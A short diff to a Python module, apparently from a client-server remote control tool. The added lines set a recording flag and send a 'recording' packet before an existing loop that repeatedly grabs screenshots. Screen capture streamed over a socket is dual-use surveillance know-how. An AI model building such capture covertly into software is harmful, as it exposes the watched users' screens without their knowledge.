@@ -7,6 +7,9 @@ if typing.TYPE_CHECKING:
     from ..handler import ServerHandler
 
 def run(socketInstance: 'ServerHandler') -> None:
+    socketInstance.isRecording = True
+    socketInstance.socketInstance.send_packet('recording')
+
     while socketInstance.isRecording:
         screenshot = ImageGrab.grab()
         screenshot = screenshot.convert("RGB")
